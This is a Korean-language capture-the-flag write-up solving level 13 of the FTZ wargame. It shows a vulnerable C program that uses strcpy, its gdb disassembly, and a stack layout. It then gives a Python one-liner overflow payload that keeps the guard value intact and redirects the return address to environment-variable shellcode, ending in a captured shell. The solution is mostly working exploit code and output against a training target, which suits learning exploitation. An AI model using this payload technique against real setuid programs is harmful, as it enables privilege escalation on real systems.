# **FTZ LEVEL13**

## <img src="http://freevector.co/wp-content/uploads/2014/07/61901-door-key.png" width="25"> **Keys**
>attackme.c
```c
#include <stdlib.h> 

main(int argc, char *argv[])
{
   long i=0x1234567;
   char buf[1024];

   setreuid( 3094, 3094 );
   if(argc > 1)
   strcpy(buf,argv[1]);

   if(i != 0x1234567) {
   printf(" Warnning: Buffer Overflow !!! \n");
   kill(0,11);
   }
}
```
`i` 의 값을 검사하고 있다. **overflow**가 일어날 때 `i` 영역을 `0x1234567` 으로 덮어줘야 된다.

gdb를 이용하여 분석해보겠다.
```
(gdb) disas main
Dump of assembler code for function main:
0x080484a0 <main+0>:	push   ebp
0x080484a1 <main+1>:	mov    ebp,esp
0x080484a3 <main+3>:	sub    esp,0x418
0x080484a9 <main+9>:	mov    DWORD PTR [ebp-12],0x1234567
0x080484b0 <main+16>:	sub    esp,0x8
0x080484b3 <main+19>:	push   0xc16
0x080484b8 <main+24>:	push   0xc16
0x080484bd <main+29>:	call   0x8048370 <setreuid>
0x080484c2 <main+34>:	add    esp,0x10
0x080484c5 <main+37>:	cmp    DWORD PTR [ebp+8],0x1
0x080484c9 <main+41>:	jle    0x80484e5 <main+69>
0x080484cb <main+43>:	sub    esp,0x8
0x080484ce <main+46>:	mov    eax,DWORD PTR [ebp+12]
0x080484d1 <main+49>:	add    eax,0x4
0x080484d4 <main+52>:	push   DWORD PTR [eax]
0x080484d6 <main+54>:	lea    eax,[ebp-1048]
0x080484dc <main+60>:	push   eax
0x080484dd <main+61>:	call   0x8048390 <strcpy>
0x080484e2 <main+66>:	add    esp,0x10
0x080484e5 <main+69>:	cmp    DWORD PTR [ebp-12],0x1234567
0x080484ec <main+76>:	je     0x804850d <main+109>
0x080484ee <main+78>:	sub    esp,0xc
0x080484f1 <main+81>:	push   0x80485a0
0x080484f6 <main+86>:	call   0x8048360 <printf>
0x080484fb <main+91>:	add    esp,0x10
0x080484fe <main+94>:	sub    esp,0x8
0x08048501 <main+97>:	push   0xb
0x08048503 <main+99>:	push   0x0
0x08048505 <main+101>:	call   0x8048380 <kill>
0x0804850a <main+106>:	add    esp,0x10
0x0804850d <main+109>:	leave  
0x0804850e <main+110>:	ret    
0x0804850f <main+111>:	nop    
End of assembler dump.
```
`ebp-12` 부분이 `0x1234567` 이 아니라면 프로그램이 종료된다.  
환경변수 를 이용하여 `shellcode` 를 삽입하고 `ebp-12` 부분에 `0x1234567` 를 넣어주겠다.( [환경변수 이용하기](https://github.com/papico0306/SystemHackingPractice/blob/master/FTZ_Solve/ftz11_solve.md "환경변수 이용하기") )
## <img src="https://pngimg.com/uploads/road/road_PNG24.png" width="25"> **Payload**
>메모리 구조
```
| buf[1024] | dummy[12] | i[4] | dummy[8] | sfp | ret |
```

>Payload
```
./attackme `python -c "print 'A'*1036+'\x67\x45\x23\x01'+'A'*12+'\x3d\xfc\xff\xbf'"`
```

## <img src="https://maxcdn.icons8.com/windows8/PNG/512/Military/sword-512.png" width="25"> **Attack**
```
[level13@ftz level13]$ ./attackme `python -c "print 'A'*1036+'\x67\x45\x23\x01'+'A'*12+'\x3d\xfc\xff\xbf'"`
sh-2.05b$ my-pass
TERM environment variable not set.

Level14 Password is "~~~~~~~~~".
```